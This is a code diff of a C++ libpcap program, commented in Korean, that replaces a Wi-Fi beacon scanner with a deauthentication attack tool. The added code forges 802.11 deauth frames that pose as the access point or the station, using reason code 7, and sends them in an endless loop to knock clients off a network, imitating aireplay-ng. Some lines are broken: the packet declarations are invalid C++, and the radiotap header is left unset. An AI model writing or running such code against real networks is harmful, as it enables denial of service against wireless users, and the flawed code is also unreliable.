@@ -1,6 +1,7 @@
 #include <pcap.h>
 #include <string>
 #include <cstring>
+#include <unistd.h>
 
 #include <stdbool.h>
 #include <stdio.h>
@@ -78,46 +79,6 @@ struct RadioTapHdr {
     uint8_t  pad_;
     uint16_t len_;
     uint32_t present_;
-
-    int8_t get_pwr() const {
-        // 1. MSB(Ext 비트) 확인 및 초기 오프셋 계산
-        size_t offset = 8; 
-        const uint32_t* next_present = &present_;
-        
-        while ((*next_present & 0x80000000) != 0) {
-            offset += 4;
-            next_present++;
-        }
-
-        // 2. Antenna Signal 필드가 존재하는지 비트 마스크로 확인
-        // (1 << RT_ANTENNA_SIGNAL) 은 0x20과 동일합니다.
-        if ((present_ & (1 << RT_ANTENNA_SIGNAL)) == 0) {
-            return 0; 
-        }
-
-        // 3. 0번 비트부터 타겟 비트(Antenna Signal) '직전'까지 반복하며 오프셋 누적
-        for (int i = 0; i < RT_ANTENNA_SIGNAL; ++i) {
-            // 현재 검사 중인 비트(i)가 켜져 있다면
-            if (present_ & (1 << i)) {
-                size_t align = RT_FIELD_INFO[i].align;
-                size_t size  = RT_FIELD_INFO[i].size;
-
-                // 정렬(Alignment) 맞추기 공식
-                offset = (offset + (align - 1)) & ~(align - 1);
-                
-                // 크기(Size) 더하기
-                offset += size;
-            }
-        }
-
-        // 4. 타겟(Antenna Signal)을 읽기 직전, 해당 필드의 정렬 수행
-        size_t target_align = RT_FIELD_INFO[RT_ANTENNA_SIGNAL].align;
-        offset = (offset + (target_align - 1)) & ~(target_align - 1);
-
-        // 5. signal 값 반환
-        const uint8_t* base_ptr = reinterpret_cast<const uint8_t*>(this);
-        return static_cast<int8_t>(base_ptr[offset]);
-    }
 };
 
 struct Mac{
@@ -152,8 +113,8 @@ struct Mac{
     }
 
     // bssid와 ssid를 출력하는 함수
-    void print_bssid() const {
-        printf("BSSID: %02x:%02x:%02x:%02x:%02x:%02x\n", addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
+    void print_mac() const {
+        printf("%02x:%02x:%02x:%02x:%02x:%02x\n", addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
     }
 };
 
@@ -166,184 +127,116 @@ typedef struct Dot11Hdr {
     Mac  addr_3; // 프로토콜마다 다르다
     uint16_t seq_control_;
 
-    public:
-    // 802.11 프레임이 Beacon인지 확인하는 멤버 함수
-    bool is_beacon() const {
-        return (subtype_ == 0x80) && (ver_type_ == 0x00);
+    // 802.11 프레임이 Deauth인지 확인하는 멤버 함수
+    bool is_deauth() const {
+        return (subtype_ == 0xc0) && (ver_type_ == 0x00);
     }
 
     
 } Dot11Hdr;
 
-struct BeaconHdr : public Dot11Hdr {
-    Mac dest() const { return addr_1; }
-    Mac src() const { return addr_2; }
-    Mac bssid() const { return addr_3; }
-    
-    struct fixed_param {
-        uint64_t timestamp; // 타임스탬프
-        uint16_t beaconInterval; // 비콘 인터벌
-        uint16_t capabilityInfo; // 기능 정보
-    };
+// Deauth 프레임 전용 구조체 (MAC 헤더 상속 + Reason Code)
+struct DeauthFrame : public Dot11Hdr {
+    // 802.11 규격에 따라 MAC 헤더 바로 뒤에 2바이트 이유(Reason) 코드가 붙습니다.
+    uint16_t reason_code_; 
 
-    struct tag_param {
-        uint8_t number;
-        uint8_t length;
-
-        void print_tag_info() const {
-            printf("Tag Number: %d, Tag Length: %d\n", number, length);
-        }
-
-        void value(const uint8_t* data) const {
-            printf("Tag[%d] Data: ", number);
-            for (int i = 0; i < length; i++) {
-                printf("%c", data[i]);
-            }
-            printf("\n");
-        }
-        tag_param* next() const {
-            return (tag_param*)((uint8_t*)this + sizeof(tag_param) + length);
-        }
-    };
-
-    // 첫 번째 태그 파라미터의 포인터를 반환하는 멤버 함수
-    tag_param* first_tag() const {
-        return (tag_param*)((uint8_t*)this + sizeof(BeaconHdr) + sizeof(fixed_param));
+    // 인젝션할 패킷을 한 번에 세팅해 주는 초기화 메서드
+    DeauthFrame(Mac dest, Mac src, Mac bssid) {
+        // [중요] 802.11 Frame Control 세팅
+        // 0xc0: Management 프레임(Type 0) 중 Deauthentication(Subtype 12)을 의미
+        subtype_ = 0xc0;        
+        ver_type_ = 0x00;       
+        
+        // Duration: 보통 Deauth 프레임 전송 시 314 마이크로초를 세팅합니다. (Little Endian 0x013a)
+        duration_id_ = 0x013a;  
+        
+        addr_1 = dest;
+        addr_2 = src;
+        addr_3 = bssid;
+        seq_control_ = 0x0000;
+        
+        // [핵심] Reason Code 7: "Class 3 frame received from nonassociated STA"
+        // 단말기에게 "너 우리 AP랑 연결 안 되어있는데 왜 데이터 보내? 당장 끊어!"라고 속이는 마법의 코드입니다.
+        reason_code_ = 0x0007; 
     }
+};
 
+// 최종적으로 메모리에 올릴 전체 패킷 구조체
+struct DeauthPacket {
+    RadioTapHdr rtap;
+    DeauthFrame deauth;
 };
 #pragma pack(pop)
-
-struct ap_node {
-    string ssid_; // station이 연결된 AP의 BSSID
-    int8_t pwr_;
-    int beaconCount_;
-};
-
-mutex m_lock;
-map<Mac, ap_node> ap_list; // BSSID를 key로, ap_node를 value로 하는 맵
-void process_beacon(Mac current_bssid, string current_ssid, int8_t current_pwr) {
-    m_lock.lock(); // 맵을 수정하기 전에 자물쇠 잠금
-
-    // 1. 맵에서 현재 BSSID가 이미 존재하는지 검색
-    auto it = ap_list.find(current_bssid);
-
-    if (it != ap_list.end()) {
-        // [기존에 존재하는 AP인 경우] -> 데이터 업데이트
-        it->second.pwr_ = current_pwr;         // 최신 신호 세기로 갱신
-        it->second.beaconCount_++;             // 비콘 카운트 1 증가
-        
-        // (선택) 처음에 Hidden SSID였다가 나중에 이름이 파악된 경우 이름 갱신
-        if (it->second.ssid_.empty() && !current_ssid.empty()) {
-            it->second.ssid_ = current_ssid;
-        }
-    } else {
-        // [처음 발견한 새로운 AP인 경우] -> 맵에 새로 추가
-        ap_node new_ap;
-        new_ap.ssid_ = current_ssid;
-        new_ap.pwr_ = current_pwr;
-        new_ap.beaconCount_ = 1;
-
-        // ap_list[current_bssid] = new_ap; 
-        ap_list.insert({current_bssid, new_ap});
-    }
-
-    m_lock.unlock(); // 수정이 끝났으니 자물쇠 풀기
-}
-
-void print_ap_list() {
-    // 화면을 지우고 맨 위로 커서 이동 (리눅스/맥 환경 ANSI 이스케이프 시퀀스)
-    // 실제 airodump처럼 보이게 해줍니다.
-    printf("\033[2J\033[1;1H"); 
-
-    printf(" BSSID              PWR   Beacons    ESSID\n");
-    printf(" --------------------------------------------------------\n");
-
-    // 맵을 순회 (Key는 pair.first, Value는 pair.second로 접근)
-    for (const auto& pair : ap_list) {
-        const Mac& bssid = pair.first;
-        const ap_node& info = pair.second;
-
-        // BSSID 출력 (MAC 주소 포맷팅)
-        bssid.print_bssid();
-
-        // Power, Beacon, SSID 출력
-        printf("%4d  %8d    %s\n", 
-            info.pwr_, 
-            info.beaconCount_, 
-            info.ssid_.c_str());
-    }
-}
-
 
 int main(int argc, char *argv[]) {
     if (!parse(&param, argc, argv))
         return -1;
 
 	char errbuf[PCAP_ERRBUF_SIZE];
-	pcap_t* pcap = pcap_open_offline("./2026-05-03-Deauth_S24U-AP_N105G-ST.pcapng", errbuf);
-	if (pcap == NULL) {
-		fprintf(stderr, "pcap_open_offline() return null - %s\n", errbuf);
-		return -1;
-	}
+    pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
+    if (pcap == NULL) {
+        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
+        return -1;
+    }
+		
 
     // 1. MAC 객체 생성 (문자열 -> 바이트 배열 변환)
     Mac ap_mac(param.ap_mac_);
     Mac station_mac;
+    bool is_broadcast = false;
     
     if (param.station_mac_ != NULL) {
         station_mac = Mac(param.station_mac_);
     } else {
         // 단말기가 지정되지 않으면 브로드캐스트 주소로 설정
         station_mac = Mac("ff:ff:ff:ff:ff:ff");
+        is_broadcast = true;
     }
 
     // 디버깅: 변환된 MAC 주소 확인
     printf("[Target Info]\n");
     printf("Interface   : %s\n", param.dev_);
-    printf("AP MAC      : %02x:%02x:%02x:%02x:%02x:%02x\n", 
-            ap_mac.addr[0], ap_mac.addr[1], ap_mac.addr[2], 
-            ap_mac.addr[3], ap_mac.addr[4], ap_mac.addr[5]);
-    printf("Station MAC : %02x:%02x:%02x:%02x:%02x:%02x\n", 
-            station_mac.addr[0], station_mac.addr[1], station_mac.addr[2], 
-            station_mac.addr[3], station_mac.addr[4], station_mac.addr[5]);
+    printf("AP MAC      : ");
+    ap_mac.print_mac();
+    printf("Station MAC : ");
+    station_mac.print_mac();
     printf("Auth Attack : %s\n", param.auth_flag_ ? "ON" : "OFF");
 
+    // 4. 전송할 패킷 조립
+    // AP -> Station 패킷 세팅
+    // 목적지: Station / 출발지: AP / BSSID: AP
+    DeauthPacket pAtoS.deauth(station_mac, ap_mac, ap_mac); 
+    // Station -> AP 패킷 세팅 (브로드캐스트가 아닐 때만 유효함)
+    // 목적지: AP / 출발지: Station / BSSID: AP
+    DeauthPacket pStoA.deauth(ap_mac, station_mac, ap_mac); 
+
+    // 5. 공격 루프 (aireplay-ng 로직 모방)
+    int count = 0;
     while (true) {
-		struct pcap_pkthdr* header;
-		const u_char* packet;
-		int res = pcap_next_ex(pcap, &header, &packet);
-		if (res == 0) continue;
-		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
-			// 에러 또는 파일 끝에 도달한 경우 루프 종료
-			break;
-		}
-
-        // Header Prasing
-		RadioTapHdr *rtap = (struct RadioTapHdr *)packet; // Radiotap Header
-        BeaconHdr *beacon = (BeaconHdr *)(packet + rtap->len_);  // BeaconHdr Casting
-        if (!beacon->is_beacon()) continue; // Check if it's a beacon frame
-
-        // 수동 계산 대신 깔끔하게 메서드 호출!
-        BeaconHdr::tag_param *tag = beacon->first_tag(); 
-
-        // 안전한 루프 탈출 조건 (pcap 헤더의 caplen 등 패킷의 끝 위치를 반드시 활용)
-        const uint8_t* packet_end = packet + header->caplen; 
-
-        // 패킷 끝을 넘지 않고, 원하는 태그(예: SSID인 0번)를 찾을 때까지 반복
-        while ((uint8_t*)tag < packet_end && tag->number != 0) { 
-            tag = tag->next();
+        // [첫 번째 샷] AP인 척하고 Station에게 쏨 (또는 Broadcast로 전체에게 쏨)
+        // reinterpret_cast를 통해 우리가 만든 구조체를 바이트 배열로 취급하여 전송
+        int res1 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pAtoS), sizeof(DeauthPacket));
+        if (res1 != 0) {
+            fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(pcap));
+            break;
         }
 
-        process_beacon(beacon->bssid(), tag->number == 0 ? string((char*)(tag + 1), tag->length) : "", rtap->get_pwr()); // pwr는 예시로 0, 실제로는 Radiotap에서 읽어와야 함
+        // [두 번째 샷] Broadcast 모드가 아니라면, Station인 척하고 AP에게도 쏨 (더 확실하게 끊기 위함)
+        if (!is_broadcast) {
+            int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&pStoA), sizeof(DeauthPacket));
+            if (res2 != 0) {
+                fprintf(stderr, "\nError sending packet: %s\n", pcap_geterr(pcap));
+                break;
+            }
+        }
 
-        // 화면 갱신 로직 추가
-        // time_t current_time = time(NULL);
-        // if (current_time - last_print_time >= 1) { // 1초가 경과했으면
-        //     print_ap_list(); // 맵 출력
-        //     last_print_time = current_time; // 마지막 출력 시간 갱신
-        // }
-
+        count++;
+        // 터미널에서 숫자가 계속 올라가도록 캐리지 리턴(\r) 사용
+        printf("\rSent %d Deauth packets...", count);
+        fflush(stdout);
+        // 너무 빨리 쏘면 랜카드가 다운되거나 운영체제 큐가 꽉 찰 수 있으므로 딜레이 부여
+        // 100,000 마이크로초 = 0.1초 딜레이 (초당 약 10번 전송)
+        usleep(100000); 
     }
     pcap_close(pcap);
 	return 0;
